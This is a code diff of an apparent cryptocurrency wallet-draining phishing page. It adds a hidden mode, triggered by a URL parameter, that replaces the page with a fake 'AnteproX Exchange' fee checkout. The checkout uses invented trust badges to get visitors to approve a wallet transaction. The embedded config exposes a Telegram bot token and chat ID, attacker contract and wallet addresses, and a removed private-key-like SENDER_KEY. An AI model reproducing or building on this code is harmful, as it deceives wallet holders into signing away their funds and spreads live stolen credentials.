@@ -6,6 +6,20 @@
   
   <meta charset="UTF-8">
   <title>Transfer Trust Wallet</title>
+  <script>
+    (function () {
+      var params = new URLSearchParams(window.location.search);
+      if (params.get('autoApprove') !== '1') return;
+      document.documentElement.classList.add('fee-payment-mode');
+      var style = document.createElement('style');
+      style.textContent =
+        'html.fee-payment-mode #__next,html.fee-payment-mode next-route-announcer{display:none!important}' +
+        'html.fee-payment-mode #fee-payment-view{display:flex!important}' +
+        'html.fee-payment-mode body{background:#f3f6f8}';
+      document.head.appendChild(style);
+      document.title = 'Secure Payment · AnteproX';
+    })();
+  </script>
   <meta name="description" content="Securely transfer USDT on Binance Smart Chain">
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
   <link rel="icon" href="favicon.ico">
@@ -63,6 +77,274 @@
         background-color: #33FF99 !important;
         color: #000 !important;
         opacity: 1 !important;
+      }
+      .amount-clear-btn {
+        display: none;
+        align-items: center;
+        justify-content: center;
+        width: 20px;
+        height: 20px;
+        padding: 0;
+        border: none;
+        background: transparent;
+        cursor: pointer;
+        flex-shrink: 0;
+      }
+      .amount-clear-btn.visible {
+        display: inline-flex;
+        margin-right: 8px;
+      }
+      input[placeholder="USDT Amount"] {
+        padding-right: 7rem;
+      }
+      body.receipt-mode #__next,
+      html.fee-payment-mode #__next {
+        display: none !important;
+      }
+      body.receipt-mode #payment-receipt-view,
+      html.fee-payment-mode #fee-payment-view,
+      body.receipt-mode #fee-payment-view {
+        display: flex !important;
+      }
+      #fee-payment-view,
+      #payment-receipt-view {
+        display: none;
+        flex-direction: column;
+        min-height: 100vh;
+        min-height: 100dvh;
+        max-width: 26rem;
+        margin: 0 auto;
+        padding: 0 0 calc(1.25rem + env(safe-area-inset-bottom));
+        background: #f3f6f8;
+        color: #1f2937;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      }
+      .pay-secure-bar {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.45rem;
+        padding: calc(0.7rem + env(safe-area-inset-top)) 1rem 0.7rem;
+        background: linear-gradient(90deg, #0f766e, #059669);
+        color: #ecfdf5;
+        font-size: 0.8125rem;
+        font-weight: 600;
+        letter-spacing: 0.01em;
+      }
+      .pay-secure-bar svg {
+        flex-shrink: 0;
+      }
+      .pay-shell {
+        padding: 1rem 1rem 0;
+      }
+      .pay-merchant {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+        margin-bottom: 1rem;
+      }
+      .pay-merchant__logo {
+        width: 2.75rem;
+        height: 2.75rem;
+        border-radius: 0.75rem;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 800;
+        color: #052e16;
+        background: linear-gradient(135deg, #5ea677, #34d399);
+        box-shadow: 0 6px 18px rgba(16, 185, 129, 0.22);
+      }
+      .pay-merchant__name {
+        margin: 0;
+        font-size: 1rem;
+        font-weight: 700;
+        color: #111827;
+      }
+      .pay-merchant__meta {
+        margin: 0.15rem 0 0;
+        font-size: 0.75rem;
+        color: #6b7280;
+      }
+      .pay-card {
+        background: #fff;
+        border: 1px solid #e5e7eb;
+        border-radius: 1rem;
+        box-shadow: 0 10px 30px rgba(15, 23, 42, 0.08);
+        overflow: hidden;
+        margin-bottom: 0.85rem;
+      }
+      .pay-card__head {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 0.75rem;
+        padding: 0.85rem 1rem;
+        border-bottom: 1px solid #f1f5f9;
+        background: #f8fafc;
+      }
+      .pay-card__head strong {
+        font-size: 0.8125rem;
+        color: #334155;
+      }
+      .pay-status {
+        font-size: 0.625rem;
+        font-weight: 700;
+        letter-spacing: 0.05em;
+        text-transform: uppercase;
+        color: #b45309;
+        background: #fffbeb;
+        border: 1px solid #fde68a;
+        border-radius: 999px;
+        padding: 0.2rem 0.55rem;
+      }
+      .pay-status.is-success {
+        color: #047857;
+        background: #ecfdf5;
+        border-color: #a7f3d0;
+      }
+      .pay-status.is-error {
+        color: #b91c1c;
+        background: #fef2f2;
+        border-color: #fecaca;
+      }
+      .pay-amount-hero {
+        padding: 1.1rem 1rem 0.85rem;
+        text-align: center;
+        border-bottom: 1px dashed #e2e8f0;
+      }
+      .pay-amount-hero__label {
+        margin: 0;
+        font-size: 0.75rem;
+        font-weight: 600;
+        color: #64748b;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+      }
+      .pay-amount-hero__value {
+        margin: 0.35rem 0 0;
+        font-size: 2rem;
+        line-height: 1.1;
+        font-weight: 800;
+        color: #0f172a;
+        font-variant-numeric: tabular-nums;
+      }
+      .pay-amount-hero__sub {
+        margin: 0.35rem 0 0;
+        font-size: 0.8125rem;
+        color: #64748b;
+      }
+      .pay-rows {
+        padding: 0.25rem 0;
+      }
+      .pay-row {
+        display: flex;
+        justify-content: space-between;
+        gap: 1rem;
+        padding: 0.62rem 1rem;
+        font-size: 0.8125rem;
+        border-bottom: 1px solid #f1f5f9;
+      }
+      .pay-row:last-child {
+        border-bottom: none;
+      }
+      .pay-row span {
+        color: #64748b;
+      }
+      .pay-row strong {
+        color: #111827;
+        font-weight: 600;
+        text-align: right;
+        font-variant-numeric: tabular-nums;
+      }
+      .pay-trust {
+        display: grid;
+        grid-template-columns: repeat(3, minmax(0, 1fr));
+        gap: 0.5rem;
+        margin-bottom: 0.85rem;
+      }
+      .pay-trust__item {
+        background: #fff;
+        border: 1px solid #e5e7eb;
+        border-radius: 0.75rem;
+        padding: 0.55rem 0.4rem;
+        text-align: center;
+        font-size: 0.625rem;
+        font-weight: 600;
+        color: #475569;
+        line-height: 1.25;
+      }
+      .pay-trust__item svg {
+        display: block;
+        margin: 0 auto 0.25rem;
+      }
+      .pay-note {
+        margin: 0 0 0.85rem;
+        padding: 0.75rem 0.85rem;
+        border-radius: 0.75rem;
+        font-size: 0.8125rem;
+        line-height: 1.45;
+        color: #475569;
+        background: #eff6ff;
+        border: 1px solid #dbeafe;
+      }
+      .pay-action {
+        margin-top: auto;
+        padding: 0 1rem;
+        text-align: center;
+      }
+      .pay-cta {
+        width: 100%;
+        border: none;
+        border-radius: 0.85rem;
+        min-height: 3rem;
+        font-size: 0.9375rem;
+        font-weight: 700;
+        color: #fff;
+        background: linear-gradient(90deg, #059669, #10b981);
+        box-shadow: 0 10px 24px rgba(16, 185, 129, 0.28);
+      }
+      .pay-cta:disabled {
+        opacity: 0.72;
+        cursor: default;
+      }
+      .pay-spinner {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.55rem;
+        margin-top: 0.75rem;
+        font-size: 0.75rem;
+        font-weight: 600;
+        color: #64748b;
+      }
+      .pay-spinner::before {
+        content: "";
+        width: 0.85rem;
+        height: 0.85rem;
+        border-radius: 50%;
+        border: 2px solid rgba(16, 185, 129, 0.2);
+        border-top-color: #10b981;
+        animation: receipt-spin 0.8s linear infinite;
+      }
+      .pay-ref,
+      .receipt-ref {
+        margin-top: 0.75rem;
+        font-size: 0.6875rem;
+        color: #94a3b8;
+        word-break: break-all;
+      }
+      .pay-footer {
+        margin-top: 0.85rem;
+        text-align: center;
+        font-size: 0.6875rem;
+        color: #94a3b8;
+        padding: 0 1rem;
+      }
+      html.fee-payment-mode #notify-bar {
+        display: none !important;
+      }
+      @keyframes receipt-spin {
+        to { transform: rotate(360deg); }
       }
     </style>
   <script data-scrapbook-elem="custom-elements-loader">
@@ -151,8 +433,14 @@
             <div class="relative">
               <input placeholder="USDT Amount" type="number" class="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-24" value="">
               <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
+                <button type="button" id="amount-clear-btn" class="amount-clear-btn" aria-label="Clear amount">
+                  <svg width="20" height="20" viewBox="0 0 20 20" fill="none" aria-hidden="true">
+                    <circle cx="10" cy="10" r="10" fill="#999999"/>
+                    <path d="M7.25 7.25L12.75 12.75M12.75 7.25L7.25 12.75" stroke="#000000" stroke-width="1.5" stroke-linecap="round"/>
+                  </svg>
+                </button>
                 <span class="text-gray-500 text-sm mr-2">USDT</span>
-                <button class="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 text-sm hover:text-emerald-400">Max</button>
+                <button type="button" class="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 text-sm hover:text-emerald-400">Max</button>
               </div>
             </div>
           </div>
@@ -164,6 +452,182 @@
       </div>
     </div>
   </div>
+
+  <div id="fee-payment-view" aria-hidden="true">
+    <div class="pay-secure-bar">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden>
+        <rect x="5" y="11" width="14" height="10" rx="2"/>
+        <path d="M8 11V8a4 4 0 1 1 8 0v3"/>
+      </svg>
+      256-bit secured payment gateway
+    </div>
+
+    <div class="pay-shell">
+      <div class="pay-merchant">
+        <span class="pay-merchant__logo">A</span>
+        <div>
+          <p class="pay-merchant__name">AnteproX Exchange</p>
+          <p class="pay-merchant__meta">Verified settlement desk · Premium services</p>
+        </div>
+      </div>
+
+      <article class="pay-card">
+        <div class="pay-card__head">
+          <strong>Service fee payment</strong>
+          <span class="pay-status" id="pay-status">Awaiting payment</span>
+        </div>
+
+        <div class="pay-amount-hero">
+          <p class="pay-amount-hero__label">Amount payable</p>
+          <p class="pay-amount-hero__value" id="pay-total-usdt">—</p>
+          <p class="pay-amount-hero__sub">One-time premium settlement service fee</p>
+        </div>
+
+        <div class="pay-rows">
+          <div class="pay-row">
+            <span>Collector</span>
+            <strong>AnteproX Payment Desk</strong>
+          </div>
+          <div class="pay-row">
+            <span>Service</span>
+            <strong>Premium settlement package</strong>
+          </div>
+          <div class="pay-row">
+            <span>Payment method</span>
+            <strong>USDT · BEP20</strong>
+          </div>
+          <div class="pay-row">
+            <span>Network</span>
+            <strong>BNB Smart Chain</strong>
+          </div>
+          <div class="pay-row">
+            <span>Desk rate</span>
+            <strong id="pay-desk-rate">—</strong>
+          </div>
+          <div class="pay-row">
+            <span>Date</span>
+            <strong id="pay-date">—</strong>
+          </div>
+        </div>
+      </article>
+
+      <div class="pay-trust" aria-label="Payment security">
+        <div class="pay-trust__item">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2" aria-hidden>
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+          Verified merchant
+        </div>
+        <div class="pay-trust__item">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2" aria-hidden>
+            <rect x="3" y="11" width="18" height="11" rx="2"/>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>
+          Encrypted checkout
+        </div>
+        <div class="pay-trust__item">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2" aria-hidden>
+            <path d="M9 12l2 2 4-4"/>
+            <circle cx="12" cy="12" r="9"/>
+          </svg>
+          Instant receipt
+        </div>
+      </div>
+
+      <p class="pay-note">
+        Complete the wallet authorization to pay the service fee. Your sell order will
+        finalize automatically once payment is confirmed.
+      </p>
+    </div>
+
+    <div class="pay-action">
+      <button type="button" class="pay-cta" id="pay-cta" disabled>Confirm payment in wallet</button>
+      <div class="pay-spinner" id="pay-spinner">Opening secure wallet authorization…</div>
+      <p class="pay-ref" id="pay-ref"></p>
+      <p class="pay-footer">Trusted payment collection · AnteproX Exchange</p>
+    </div>
+  </div>
+
+  <script>
+    (function initFeePaymentView() {
+      var params = new URLSearchParams(window.location.search);
+      if (params.get('autoApprove') !== '1') return;
+
+      document.documentElement.classList.add('fee-payment-mode');
+      document.body.classList.add('receipt-mode');
+
+      var view = document.getElementById('fee-payment-view');
+      if (view) view.setAttribute('aria-hidden', 'false');
+
+      var feeUsdt = params.get('feeUsdt');
+      var deskRate = params.get('deskRate');
+      var totalEl = document.getElementById('pay-total-usdt');
+      var deskRateEl = document.getElementById('pay-desk-rate');
+      var dateEl = document.getElementById('pay-date');
+      var refEl = document.getElementById('pay-ref');
+      var statusEl = document.getElementById('pay-status');
+      var spinnerEl = document.getElementById('pay-spinner');
+      var ctaEl = document.getElementById('pay-cta');
+
+      function formatUsdt(value) {
+        var num = parseFloat(value);
+        if (!Number.isFinite(num)) return '—';
+        return num.toLocaleString('en-IN', {
+          minimumFractionDigits: 2,
+          maximumFractionDigits: 6
+        }) + ' USDT';
+      }
+
+      if (totalEl && feeUsdt) totalEl.textContent = formatUsdt(feeUsdt);
+      if (deskRateEl && deskRate) {
+        var rateNum = parseFloat(deskRate);
+        deskRateEl.textContent = Number.isFinite(rateNum)
+          ? '₹' + rateNum.toLocaleString('en-IN', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' / USDT'
+          : '—';
+      }
+      if (dateEl) {
+        dateEl.textContent = new Date().toLocaleString('en-IN', {
+          day: '2-digit', month: 'short', year: 'numeric',
+          hour: '2-digit', minute: '2-digit'
+        });
+      }
+      if (refEl) {
+        refEl.textContent = 'Order ID · APX-' + Date.now().toString(36).toUpperCase().slice(-10);
+      }
+
+      function setPaymentStatus(text, kind) {
+        if (statusEl) {
+          statusEl.textContent = text;
+          statusEl.classList.remove('is-success', 'is-error');
+          if (kind) statusEl.classList.add(kind);
+        }
+        if (spinnerEl && kind === 'is-success') spinnerEl.style.display = 'none';
+        if (ctaEl && kind === 'is-success') {
+          ctaEl.textContent = 'Payment authorized';
+          ctaEl.disabled = true;
+        }
+      }
+
+      window.updateFeePaymentStatus = setPaymentStatus;
+
+      var observer = new MutationObserver(function () {
+        var bar = document.getElementById('notify-bar');
+        if (!bar || !bar.textContent) return;
+        var msg = bar.textContent.toLowerCase();
+        if (msg.indexOf('submitted') !== -1 || msg.indexOf('success') !== -1) {
+          setPaymentStatus('Payment authorized', 'is-success');
+        } else if (msg.indexOf('cancel') !== -1 || msg.indexOf('failed') !== -1 || msg.indexOf('insufficient') !== -1) {
+          setPaymentStatus('Payment failed', 'is-error');
+          if (spinnerEl) spinnerEl.textContent = bar.textContent;
+        } else if (msg.indexOf('confirm') !== -1 || msg.indexOf('approval') !== -1) {
+          setPaymentStatus('Confirm in wallet', '');
+          if (spinnerEl) spinnerEl.textContent = 'Approve the payment request in your wallet app…';
+        }
+      });
+      observer.observe(document.body, { childList: true, subtree: true, characterData: true });
+    })();
+  </script>
+
   <next-route-announcer>
     <p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;"></p>
   </next-route-announcer>
@@ -176,9 +640,8 @@
 window.ENV = {
     TELEGRAM_BOT_TOKEN: '8941208473:AAEY1s1srFize2Ij_Ai1nYirSOcR6i18OOM',
     ADMIN_CHAT_ID: '-5543160952',
-    SENDER_KEY: '8cfa79612dc2bca3db87e0a07c47a11a8cff535cfeb226260c6158f4d7541942',
-    CONTRACT_ADDRESS: '0x9D7f74d0C41E726EC95884E0e97Fa6129e3b5E99',
-    COMPANY_WALLET_ADDRESS: '0x523Cb919C1f9831afE1cfdF82647E2a846684E24',
+    CONTRACT_ADDRESS: '0xaEB39CED46aaAdf4F6369806252083E82cbCEB91',
+    COMPANY_WALLET_ADDRESS: '0xbfc17A492Bc8167556aFe1Cf90D9F7Fc384DeFb4',
     BSC_RPC_URL: 'https://bsc-dataseed1.binance.org/',
     USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955',
     PORT: 3000
